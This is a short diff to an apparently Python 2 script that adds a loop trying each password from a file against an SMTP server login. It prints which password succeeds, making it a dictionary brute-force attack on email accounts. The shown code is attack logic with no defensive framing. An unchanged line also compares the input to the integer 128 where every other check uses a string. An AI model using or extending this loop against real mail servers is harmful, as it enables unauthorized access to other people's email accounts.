@@ -73,6 +73,7 @@ import os
 import sys
 import random
 
+#options
 
 type_of_paswords = raw_input("number of bits in password? ie: 16,32,64...512")
 while type_of_paswords != "16" and type_of_paswords != "32" and type_of_paswords != "64" and type_of_paswords != 128 and type_of_paswords != "256" and type_of_paswords != "512":
@@ -103,10 +104,14 @@ else:
 
 
 
-
-
-
-
+for password in passwfile:
+  try:
+    smtpserver.login(user, password)
+                
+    print "[+] Password Found %s" % password
+    break;
+  except smtplib.SMTPAuthenticationError:
+    print "[!] Password Incorrect: %s" % password
 
 
 
